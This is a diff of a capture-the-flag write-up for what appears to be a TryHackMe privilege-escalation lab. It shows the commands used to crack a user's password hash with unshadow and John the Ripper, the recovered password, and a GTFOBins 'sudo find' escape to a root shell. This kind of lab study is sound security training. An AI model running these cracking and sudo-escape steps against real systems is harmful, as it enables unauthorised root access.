@@ -794,7 +794,6 @@ uid=0(root) gid=0(root) groups=0(root),1001(karen)
 > You have gained SSH access to a large scientific facility. Try to elevate your privileges until you are Root.
 > Leave no privilege escalation vector unexplored, privilege escalation is often more an art than a science.
 
-### Enumeration
 * `hostname` : ip-10-10-91-89
 * `name -a` : Linux ip-10-10-91-89 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 * `cat /proc/version` : Linux version 3.10.0-1160.el7.x86_64 (mockbuild@kbuilder.bsys.centos.org) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) ) #1 SMP Mon Oct 19 16:18:59 UTC 2020
@@ -845,25 +844,25 @@ mkdir ./Desktop/Capstone
 cd ./Desktop/Capstone
 touch passwd.txt shadow.txt passwords.txt
 ```
-* Copied missy's unshadowed password hash into "shadow.txt"
+* Copied missy user unshadowed password hash into "shadow.txt"
 ```
 missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
 ```
-* Copied missy's user data from `etc/passwd` into "passwd.txt".
+* Copied missy user data from `etc/passwd` into "passwd.txt".
 ```
 cat /etc/passwd | grep missy
 missy:x:1001:1001::/home/missy:/bin/bash
 ```
-*  Used `unshadow` to create a file crackable by John the Ripper.
+*  Used `unshadow` to create file crackable by John the Ripper.
 ```
 unshadow /root/Desktop/Capstone/passwd.txt /root/Desktop/Capstone/shadow.txt > /root/Desktop/Capstone/passwords.txt
 ```
-* Used John to brute force missy's password.
+* Used John to brute force missy user password.
 ```
 john --wordlist=/usr/share/wordlists/rockyou.txt /root/Desktop/Capstone/passwords.txt 
 ```
-* This recovered "Password1".
-* Used SSH to connect to target as missy.
+* Recovered "Password1" for missy user.
+* Used SSH to connect to target as missy user.
 ```
 ssh missy@10.10.91.89
 ```
@@ -904,19 +903,16 @@ User missy may run the following commands on ip-10-10-91-89:
 cat ./Documents/flag1.txt` 
 THM-42828719920544
 ```
-* `history` output of missy user suggets exploitation of `find` sodo dlegation.
-* [GTFObins](https://gtfobins.github.io/gtfobins/find/) has exploit for sudo `find`.
+* `history` output of missy user suggests exploitation of `find` sudo delegation.
+* [GTFObins](https://gtfobins.github.io/gtfobins/find/) confirms exploit.
 
 > ## Sudo
 > If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
 > sudo find . -exec /bin/sh \; -quit
 
-* Used sudo exploit.
+* Used exploit to elevate privileges to root.
 ```
 find / -name rootflag 2>/bin/null
-```
-* This elevate missy user to root.
-```
 h-4.2# id
 uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 ```
